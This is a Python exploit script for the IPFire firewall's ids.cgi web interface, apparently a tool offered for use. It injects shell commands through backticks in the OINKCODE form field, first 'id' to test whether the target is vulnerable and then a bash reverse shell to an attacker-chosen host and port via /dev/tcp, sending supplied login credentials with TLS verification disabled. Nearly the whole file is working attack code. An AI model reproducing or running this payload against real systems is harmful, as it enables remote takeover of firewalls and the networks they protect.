import argparse
import getpass
import requests

# Função para enviar o shell reverso
def revShell(revhost, revport):
    payload = 'bash -i >& /dev/tcp/' + revhost + '/' + str(revport) + ' 0>&1'
    evildata["OINKCODE"] = '`' + payload + '`'
    print("[+] Sending Malicious Payload to", url, "[+]")
    req = requests.post(url, data=evildata, headers=headers, auth=(username, password), verify=False)

# Função para verificar a vulnerabilidade
def verifyVuln(revhost, revport):
    req = requests.post(url, data=evildata, headers=headers, auth=(username, password), verify=False)
    if req.status_code == 200:
        print("[+] IPFire Installation is Vulnerable [+]")
        revShell(revhost, revport)
    else:
        print("[+] Not Vulnerable [+]")

if __name__ == "__main__":
    banner = r"""
 _____                 _ _  ______                           
/  ___|               | | | | ___ \                          
\ `--. _ __ ___   __ _| | | | |_/ /_   _ _ __   __ _ ___ ___ 
 `--. \ '_ ` _ \ / _` | | | | ___ \ | | | '_ \ / _` / __/ __|
/\__/ / | | | | | (_| | | | | |_/ / |_| | |_) | (_| \__ \__ \
\____/|_| |_| |_|\__,_|_|_| \____/ \__, | .__/ \__,_|___/___/
                                    __/ | |                  
                                   |___/|_|                  
"""

    parser = argparse.ArgumentParser(description="IPFire Exploit Script", usage="%(prog)s --revhost REVHOST --revport REVPORT --url URL --u User --p Password")
    parser.add_argument("--revhost", required=True, help="Specify the reverse shell host (e.g., 192.168.1.100)")
    parser.add_argument("--revport", required=True, type=int, help="Specify the reverse shell port (e.g., 1337)")
    parser.add_argument("--url", required=True, help="Specify the URL of the vulnerable host (e.g., https://192.168.56.102:444/cgi-bin/ids.cgi)")
    parser.add_argument("--u", required=True, help="Specify the username for authentication")
    parser.add_argument("--p", required=True, help="Specify the password for authentication")

    args = parser.parse_args()

    revhost = args.revhost
    revport = args.revport
    url = args.url
    username = args.u
    password = args.p

    evildata = {'ENABLE_SNORT_GREEN': 'on', 'ENABLE_SNORT': 'on', 'RULES': 'registered', 'OINKCODE': '`id`', 'ACTION': 'Download new ruleset', 'ACTION2': 'snort'}
    headers = {
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept': 'text/html,application/xhtml+xml,application.xml;q=0.9,*/*;q=0.8',
        'User-Agent': 'IPFIRE Exploit',
        'Referer': url,
        'Upgrade-Insecure-Requests': '1'
    }

    print(banner)
    verifyVuln(revhost, revport)
